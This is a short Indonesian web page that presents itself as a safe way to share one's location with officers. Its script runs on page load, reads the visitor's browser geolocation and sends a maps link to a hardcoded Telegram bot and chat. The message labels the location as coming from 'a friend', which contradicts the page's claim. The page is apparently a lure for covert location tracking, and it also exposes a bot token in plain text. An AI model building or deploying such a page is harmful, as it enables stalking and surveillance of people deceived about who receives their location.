
<!DOCTYPE html>
<html>
<head>
  <title>Share Lokasi Aman</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
  <h2>Bagikan Lokasi Kamu</h2>
  <p>Mohon izinkan akses lokasi agar bisa langsung dikirim ke petugas.</p>

  <script>
    const telegramBotToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
    const telegramChatId = "5677912817";

    navigator.geolocation.getCurrentPosition(
      function(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
        const message = `Lokasi terkini dari teman:
${mapsLink}`;

        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message
          })
        });

        document.body.innerHTML = "<p>Lokasi kamu berhasil dikirim dengan aman.</p>";
      },
      function(error) {
        document.body.innerHTML = "<p>Gagal mendapatkan lokasi. Mohon izinkan akses lokasi di browser kamu.</p>";
      }
    );
  </script>
</body>
</html>
